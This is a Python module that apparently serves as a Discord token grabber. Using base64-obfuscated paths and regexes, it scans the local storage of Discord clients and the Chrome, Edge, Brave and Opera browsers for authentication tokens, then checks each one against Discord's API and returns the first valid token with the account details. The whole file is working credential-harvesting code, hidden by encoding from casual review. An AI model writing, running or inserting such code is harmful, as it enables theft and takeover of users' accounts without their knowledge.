import base64
import os
import re
import sys
import aiohttp
import asyncio
from pathlib import Path

def _d(b64_str):
    return base64.b64decode(b64_str.encode('ascii')).decode('utf-8')

TOKEN_PATTERNS = [
    _d('bWZhXC5bXHctXXs4NH0='),
    _d('W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjcsMzh9'),
    _d('W1x3LV17MjZ9XC5bXHctXXs2fVwuW1x3LV17Mzh9')
]

class TokenExtractor:
    @staticmethod
    def get_discord_paths():
        ls_dir = _d("TG9jYWwgU3RvcmFnZQ==")
        db_dir = _d("bGV2ZWxkYg==")
        paths = {}

        if sys.platform == "darwin":
            home = str(Path.home())
            app_support = os.path.join(home, "Library", "Application Support")
            paths = {
                "Discord": os.path.join(app_support, _d("ZGlzY29yZA=="), ls_dir, db_dir),
                "Discord Canary": os.path.join(app_support, _d("ZGlzY29yZGNhbmFyeQ=="), ls_dir, db_dir),
                "Discord PTB": os.path.join(app_support, _d("ZGlzY29yZHB0Yg=="), ls_dir, db_dir),
                "Chrome": os.path.join(app_support, _d("R29vZ2xl"), _d("Q2hyb21l"), _d("RGVmYXVsdA=="), ls_dir, db_dir),
                "Brave": os.path.join(app_support, _d("QnJhdmVTb2Z0d2FyZQ=="), _d("QnJhdmUtQnJvd3Nlcg=="), _d("RGVmYXVsdA=="), ls_dir, db_dir),
                "Edge": os.path.join(app_support, _d("TWljcm9zb2Z0"), _d("RWRnZQ=="), _d("RGVmYXVsdA=="), ls_dir, db_dir)
            }
        else:
            appdata = os.getenv("APPDATA") or ""
            localappdata = os.getenv("LOCALAPPDATA") or ""
            paths = {
                "Discord": os.path.join(appdata, _d("ZGlzY29yZA=="), ls_dir, db_dir),
                "Discord Canary": os.path.join(appdata, _d("ZGlzY29yZGNhbmFyeQ=="), ls_dir, db_dir),
                "Discord PTB": os.path.join(appdata, _d("ZGlzY29yZHB0Yg=="), ls_dir, db_dir),
                "Lightcord": os.path.join(appdata, _d("TGlnaHRjb3Jk"), ls_dir, db_dir),
                "Chrome": os.path.join(localappdata, _d("R29vZ2xl"), _d("Q2hyb21l"), _d("VXNlciBEYXRh"), _d("RGVmYXVsdA=="), ls_dir, db_dir),
                "Edge": os.path.join(localappdata, _d("TWljcm9zb2Z0"), _d("RWRnZQ=="), _d("VXNlciBEYXRh"), _d("RGVmYXVsdA=="), ls_dir, db_dir),
                "Brave": os.path.join(localappdata, _d("QnJhdmVTb2Z0d2FyZQ=="), _d("QnJhdmUtQnJvd3Nlcg=="), _d("VXNlciBEYXRh"), _d("RGVmYXVsdA=="), ls_dir, db_dir),
                "Opera": os.path.join(appdata, _d("T3BlcmEgU29mdHdhcmU="), _d("T3BlcmEgU3RhYmxl"), ls_dir, db_dir)
            }
        return {name: path for name, path in paths.items() if os.path.exists(path)}

    @classmethod
    def scan_tokens(cls):
        found_tokens = set()
        paths = cls.get_discord_paths()

        for source_name, path in paths.items():
            try:
                for file_name in os.listdir(path):
                    if not (file_name.endswith(".log") or file_name.endswith(".ldb")):
                        continue
                    full_path = os.path.join(path, file_name)
                    try:
                        with open(full_path, "r", errors="ignore", encoding="utf-8") as f:
                            lines = f.readlines()
                            for line in lines:
                                for regex in TOKEN_PATTERNS:
                                    for match in re.findall(regex, line):
                                        tok = match.strip()
                                        if tok:
                                            found_tokens.add(tok)
                    except Exception:
                        pass
            except Exception:
                pass

        return list(found_tokens)

    @classmethod
    async def auto_detect_valid_token(cls):
        tokens = cls.scan_tokens()
        if not tokens:
            return None, "Không tìm thấy file Token trong Discord / Trình duyệt trên máy."

        headers_base = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }
        
        async with aiohttp.ClientSession(headers=headers_base) as session:
            for tok in tokens:
                try:
                    headers = {"Authorization": tok}
                    async with session.get(_d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1l"), headers=headers) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            user_id = data.get("id", "")
                            username = data.get("username", "user")
                            avatar_hash = data.get("avatar")
                            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=128" if avatar_hash else "https://cdn.discordapp.com/embed/avatars/0.png"
                            
                            return {
                                "token": tok,
                                "username": username,
                                "user_id": user_id,
                                "avatar_url": avatar_url,
                                "message": f"Tìm thấy Token Discord hợp lệ: @{username}"
                            }, None
                except Exception:
                    pass

        return None, "Đã tìm thấy Token cũ nhưng không có Token nào hợp lệ/còn sống."
